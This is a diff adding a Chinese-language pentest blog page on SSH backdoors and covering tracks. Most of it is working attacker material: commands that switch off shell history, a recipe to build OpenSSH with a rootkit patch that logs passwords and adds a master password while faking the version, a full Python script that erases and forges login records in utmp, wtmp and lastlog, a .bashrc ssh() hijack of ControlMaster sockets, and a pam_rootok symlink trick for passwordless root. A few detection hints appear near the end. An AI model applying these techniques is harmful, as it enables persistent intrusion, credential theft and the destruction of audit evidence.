@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>SSH后门和清除痕迹</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/clear-history.html" rel="bookmark"
+           title="Permalink to SSH后门和清除痕迹">SSH后门和清除痕迹</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2016-04-13T00:00:00+02:00">
+                <a href='#'>04/13/2016 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>对于SSH来说，登录主机之后先执行：
+<code>unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace</code></p>
+<p>然后是SSH留后门的方法<a href="http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108">http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108</a>简单来说就是以下的代码：</p>
+<div class="highlight"><pre><span></span>yum install -y openssl openssl-devel pam-devel
+http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
+http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz
+tar zxvf openssh-5.9p1.tar.gz   
+tar zxvf 0x06-openssh-5.9p1.patch.tar.gz   
+<span class="nb">cd</span> openssh-5.9p1.patch/   
+cp sshbd5.9p1.diff ../openssh-5.9p1   
+<span class="nb">cd</span> ../openssh-5.9p1   
+patch &lt; sshbd5.9p1.diff   //patch  后门
+执行vi includes.h
+
++#define ILOG <span class="s2">&quot;/tmp/ilog&quot;</span> //记录登录到本机的用户名和密码
++#define OLOG <span class="s2">&quot;/tmp/olog&quot;</span> //记录本机登录到远程的用户名和密码
++#define SECRETPW <span class="s2">&quot;123456654321&quot;</span> //你后门的密码
+
+执行vi version.h
+
+<span class="c1">#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span>
+<span class="c1">#define SSH_PORTABLE &quot;小版本号&quot;</span>
+./configure --prefix<span class="o">=</span>/usr --sysconfdir<span class="o">=</span>/etc/ssh --with-pam --with-kerberos5
+make <span class="o">&amp;&amp;</span> make install 
+service sshd restart //重启sshd
+</pre></div>
+
+
+<p><a href="http://blog.csdn.net/bnxf00000/article/details/45217831">http://blog.csdn.net/bnxf00000/article/details/45217831</a></p>
+<p>接下来删除登录的历史记录，使用<a href="http://0cx.cc/python_logtamper.jspx">logtamper.py</a>代码复制过来：</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python </span>
+<span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">pwd</span> <span class="kn">import</span> <span class="n">getpwnam</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">strptime</span><span class="p">,</span> <span class="n">mktime</span>
+<span class="kn">from</span> <span class="nn">optparse</span> <span class="kn">import</span> <span class="n">OptionParser</span>
+
+<span class="n">UTMPFILE</span> <span class="o">=</span> <span class="s2">&quot;/var/run/utmp&quot;</span>
+<span class="n">WTMPFILE</span> <span class="o">=</span> <span class="s2">&quot;/var/log/wtmp&quot;</span>
+<span class="n">LASTLOGFILE</span> <span class="o">=</span> <span class="s2">&quot;/var/log/lastlog&quot;</span>
+
+<span class="n">LAST_STRUCT</span> <span class="o">=</span> <span class="s1">&#39;I32s256s&#39;</span>
+<span class="n">LAST_STRUCT_SIZE</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">LAST_STRUCT</span><span class="p">)</span>
+
+<span class="n">XTMP_STRUCT</span> <span class="o">=</span> <span class="s1">&#39;hi32s4s32s256shhiii4i20x&#39;</span>
+<span class="n">XTMP_STRUCT_SIZE</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">XTMP_STRUCT</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">getXtmp</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">hostname</span><span class="p">):</span>
+    <span class="n">xtmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="nb">bytes</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">XTMP_STRUCT_SIZE</span><span class="p">)</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="nb">bytes</span><span class="p">:</span>
+                <span class="k">break</span>
+
+            <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">XTMP_STRUCT</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">)</span>
+            <span class="n">record</span> <span class="o">=</span> <span class="p">[(</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">])(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">record</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">record</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="n">hostname</span><span class="p">):</span>
+                <span class="k">continue</span>
+            <span class="n">xtmp</span> <span class="o">+=</span> <span class="nb">bytes</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Cannot open file: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">xtmp</span>
+
+
+<span class="k">def</span> <span class="nf">modifyLast</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">ttyname</span><span class="p">,</span> <span class="n">strtime</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">getpwnam</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;No such user.&#39;</span><span class="p">)</span>
+
+    <span class="n">timestamp</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">str2time</span> <span class="o">=</span> <span class="n">strptime</span><span class="p">(</span><span class="n">strtime</span><span class="p">,</span> <span class="s1">&#39;%Y:%m:</span><span class="si">%d</span><span class="s1">:%H:%M:%S&#39;</span><span class="p">)</span>
+        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">mktime</span><span class="p">(</span><span class="n">str2time</span><span class="p">))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Time format err.&#39;</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="n">LAST_STRUCT</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">ttyname</span><span class="p">,</span> <span class="n">hostname</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">LAST_STRUCT_SIZE</span> <span class="o">*</span> <span class="n">p</span><span class="o">.</span><span class="n">pw_uid</span><span class="p">)</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Cannot open file: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+
+<span class="k">def</span> <span class="nf">showMessage</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+    <span class="k">print</span> <span class="n">msg</span>
+    <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">saveFile</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w+b&#39;</span><span class="p">)</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IOError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">usage</span> <span class="o">=</span> <span class="s1">&#39;usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188</span><span class="se">\n</span><span class="s1"> </span><span class="se">\</span>
+<span class="s1">        logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12&#39;</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">OptionParser</span><span class="p">(</span><span class="n">usage</span><span class="o">=</span><span class="n">usage</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-m&#39;</span><span class="p">,</span> <span class="s1">&#39;--mode&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;MODE&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;1: utmp, 2: wtmp, 3: lastlog [default: 1]&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="s1">&#39;--ttyname&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;TTYNAME&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-f&#39;</span><span class="p">,</span> <span class="s1">&#39;--filename&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;FILENAME&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">,</span> <span class="s1">&#39;--username&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;USERNAME&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-i&#39;</span><span class="p">,</span> <span class="s1">&#39;--hostname&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;HOSTNAME&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="s1">&#39;--dateline&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;DATELINE&#39;</span><span class="p">)</span>
+    <span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">UTMPFILE</span>
+
+            <span class="c1"># tamper</span>
+            <span class="n">newData</span> <span class="o">=</span> <span class="n">getXtmp</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">)</span>
+            <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>
+
+        <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;2&#39;</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">WTMPFILE</span>
+
+            <span class="c1"># tamper</span>
+            <span class="n">newData</span> <span class="o">=</span> <span class="n">getXtmp</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">)</span>
+            <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>
+
+        <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;3&#39;</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">LASTLOGFILE</span>
+
+            <span class="c1"># tamper</span>
+            <span class="n">modifyLast</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span><span class="p">)</span>
+
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
+</pre></div>
+
+
+<p>====
+更新：</p>
+<p>上面的可以在debain系使用，感觉下面这种方法更通用：
+有两种方式:</p>
+<ol>
+<li>修改<code>/etc/ssh/ssh_config</code>或者 <code>~/.ssh/config</code> 配置文件:</li>
+</ol>
+<p>Host *</p>
+<p>ControlPath /tmp/%r@%h:%p
+ControlMaster auto
+ControlPersist yes</p>
+<p>此时开启了Controlmaster模式，如果当前用户已经登录过一次目标机器，可以直接使用socket文件登录。</p>
+<ol>
+<li>直接修改~/.bashrc文件</li>
+</ol>
+<div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="p">()</span> 
+<span class="p">{</span> 
+    <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;ControlMaster=auto&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;ControlPath=/tmp/%r@%h:%p&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;ControlPersist=yes&quot;</span> <span class="s">&quot;$@&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>然后使用ssh登录的时候:</p>
+<p><code>ssh -S root@x.x.x.x\:22 %h</code></p>
+<p>===
+进阶，未测试：</p>
+<p>如果sockets文件存在，可以创建一个tunnel:</p>
+<div class="highlight"><pre><span></span><span class="n">lsof</span> <span class="o">-</span><span class="n">i</span> <span class="nl">TCP</span><span class="p">:</span><span class="mi">9090</span>
+<span class="n">ssh</span> <span class="o">-</span><span class="n">O</span> <span class="n">forward</span> <span class="o">-</span><span class="n">D</span> <span class="mi">9090</span> <span class="o">-</span><span class="n">S</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">root</span><span class="mf">@112.124.20.20</span><span class="err">\</span><span class="o">:</span><span class="mi">22</span> <span class="o">%</span><span class="n">h</span>
+<span class="n">lsof</span> <span class="o">-</span><span class="n">i</span> <span class="nl">TCP</span><span class="p">:</span><span class="mi">9090</span> 
+</pre></div>
+
+
+<p>然后就可以使用9090端口作为socks5代理。</p>
+<p>检测方法:</p>
+<ol>
+<li>检查ssh配置文件里面，是否开启ContronMaster模式</li>
+</ol>
+<div class="highlight"><pre><span></span>  <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_config</span>
+  <span class="err">$</span><span class="n">HOME</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">config</span>
+</pre></div>
+
+
+<ol>
+<li>检查bash自定义函数是否有ssh()劫持</li>
+</ol>
+<p><code>set|grep "ssh()"</code></p>
+<p>========
+再更新：</p>
+<p>在linux里面有这么一句话，快速建立后门：</p>
+<div class="highlight"><pre><span></span><span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">sshd</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">su</span><span class="p">;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">su</span> <span class="o">-</span><span class="n">oport</span><span class="o">=</span><span class="mi">12345</span>
+</pre></div>
+
+
+<p>然后 <code>ssh root@xxxxx -p 12345</code>随便输入密码，即可获得root权限。</p>
+<p>原理:</p>
+<p><a href="http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/">http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/</a>
+<a href="https://xianzhi.aliyun.com/forum/read/790.html">https://xianzhi.aliyun.com/forum/read/790.html</a></p>
+<p>简单来说:在sshd服务配置运行pam认证的前提下，PAM配置文件中控制标示为sufficient时，只要pam_rootok模块检测uid为0即可成功登录。</p>
+<p>注意点: </p>
+<ul>
+<li><code>/etc/ssh/sshd_config</code>里面要配置<code>UsePAM yes</code></li>
+<li>可以更改软链接的位置，但是不能更改链接文件名</li>
+<li>ln -sf /usr/sbin/sshd /home/su;/home/su -oport=12345 成功</li>
+<li>ln -sf /usr/sbin/sshd /tmp/pam_test;/tmp/pam_test -oport=12345 失败</li>
+<li>此类ssh后门核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能，可以自己添加</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="n">echo</span> <span class="ss">&quot;auth sufficient pam_rootok.so&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">hacker</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">hacker</span>
+<span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">sshd</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">hacker</span><span class="p">;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">hacker</span> <span class="o">-</span><span class="n">oport</span><span class="o">=</span><span class="mi">12345</span>
+</pre></div>
+
+
+<p>只要文件中包含<code>auth sufficient pam_rootok.so</code>，即可无密码登录，可以在<code>/etc/pam.d</code>目录中查找这个配置:</p>
+<div class="highlight"><pre><span></span><span class="n">find</span> <span class="p">.</span><span class="o">/</span> <span class="o">|</span><span class="n">xargs</span> <span class="n">grep</span> <span class="ss">&quot;pam_rootok&quot;</span>
+</pre></div>
+
+
+<p>ubuntu 14里面如下的结果:</p>
+<div class="highlight"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">su</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span> <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">su</span><span class="p">:</span><span class="o">#</span> <span class="n">permitted</span> <span class="n">earlier</span> <span class="k">by</span> <span class="n">e</span><span class="p">.</span><span class="k">g</span><span class="p">.</span> <span class="ss">&quot;sufficient pam_rootok.so&quot;</span><span class="p">).</span>
+<span class="p">.</span><span class="o">/</span><span class="n">chfn</span><span class="p">:</span><span class="n">auth</span>     <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">schroot</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span> <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">runuser</span><span class="p">:</span><span class="n">auth</span>      <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">chsh</span><span class="p">:</span><span class="n">auth</span>     <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+</pre></div>
+
+
+<p>Centos 6.7结果如下:</p>
+<div class="highlight"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">runuser</span><span class="p">:</span><span class="n">auth</span>      <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">config</span><span class="o">-</span><span class="n">util</span><span class="p">:</span><span class="n">auth</span>      <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">su</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">chfn</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>   <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">setup</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>   <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">xserver</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span> <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">chsh</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>   <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">poweroff</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>    <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">halt</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>    <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">wireshark</span><span class="p">:</span><span class="n">auth</span>        <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">eject</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>   <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+<span class="p">.</span><span class="o">/</span><span class="n">reboot</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
